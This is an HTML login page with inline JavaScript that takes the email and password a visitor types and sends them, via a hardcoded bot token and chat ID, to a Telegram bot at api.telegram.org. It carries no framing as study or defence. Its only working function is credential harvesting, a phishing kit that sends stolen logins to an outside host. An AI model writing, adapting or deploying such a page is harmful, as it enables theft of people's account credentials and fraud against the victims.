<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login Form</title>
</head>
<body>
  <form id="login-form">
    <input type="email" name="email" placeholder="Email" required />
    <input type="password" name="password" placeholder="Password" required />
    <button type="submit">Send</button>
  </form>

  <script>
    const botToken = '7240803358:AAEHbrZsR5qeU570PBSvxKQGM3VnXAbN6C0';
    const chatId = '5970218151';

    document.getElementById('login-form').addEventListener('submit', function(e) {
      e.preventDefault();

      const form = e.target;
      const email = form.email.value;
      const password = form.password.value;

      const message = `🔐 *New Login Attempt*%0A📧 Email: ${email}%0A🔑 Password: ${password}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`)
        .then(response => {
          if (response.ok) {
            alert('Sent to Telegram!');
            form.reset();
          } else {
            alert('Error sending message.');
          }
        })
        .catch(error => alert('Request failed: ' + error));
    });
  </script>
</body>
</html>
